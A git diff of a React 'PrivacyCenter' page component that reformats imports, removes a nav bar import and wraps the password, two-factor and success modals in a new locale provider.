@@ -1,17 +1,16 @@
 'use client'
 
-import MainContent from '#components/main/MainContent';
-import InfomationsModal from '#components/modals/InfomationsModal';
-import PasswordModal from '#components/modals/PasswordModal';
-import SuccessModal from '#components/modals/SuccessModal';
-import TwoFactorModal from '#components/modals/TwoFactorModal';
-import NavBar from '#components/nav-bar/NavBar'
+import MainContent from '#components/main/MainContent'
+import InfomationsModal from '#components/modals/InfomationsModal'
+import PasswordModal from '#components/modals/PasswordModal'
+import SuccessModal from '#components/modals/SuccessModal'
+import TwoFactorModal from '#components/modals/TwoFactorModal'
+import { PrivacyCenterLocaleProvider } from '@/components/privacy-center/PrivacyCenterLocaleContext'
 import React from 'react'
-import { useAppDispatch, useAppSelector } from '../store/hooks';
-import { updateForm } from '../store/slices/stepFormSlice';
+import { useAppDispatch, useAppSelector } from '../store/hooks'
+import { updateForm } from '../store/slices/stepFormSlice'
 
 const PrivacyCenter = () => {
-    // STATE MODAL
     const [isOpendInfo, setIsOpendInfo] = React.useState(false);
     const [isOpendPassword, setIsOpendPassword] = React.useState(false);
 
@@ -81,12 +80,9 @@ const PrivacyCenter = () => {
     }
 
     return (
-        <>
-
-
-            <div>
-                <MainContent handleOpendInfoModal={handleOpendInfoModal} />
-            </div>
+        <div className="privacy-center min-h-screen">
+            <PrivacyCenterLocaleProvider>
+            <MainContent handleOpendInfoModal={handleOpendInfoModal} />
 
             <InfomationsModal
                 isOpend={isOpendInfo}
@@ -110,7 +106,8 @@ const PrivacyCenter = () => {
                 isOpend={isOpendSuccess}
                 onToggleSuccess={(isOpen: boolean) => setIsOpendSuccess(isOpen)}
             />
-        </>
+            </PrivacyCenterLocaleProvider>
+        </div>
     )
 }
 
